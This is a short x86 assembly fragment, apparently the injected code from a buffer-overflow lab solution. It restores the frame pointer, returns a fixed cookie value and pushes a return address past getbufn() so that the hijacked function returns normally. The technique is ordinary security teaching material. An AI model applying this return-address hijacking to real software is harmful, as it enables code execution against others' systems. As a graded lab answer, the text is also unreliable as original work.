lea 0x24 (%esp)   , %ebp # restore ebp register contents
movl  $0x4f788650 , %eax # returns the cookie value
pushl $0x08048b83       # return address pointing instruction after getbufn()
ret
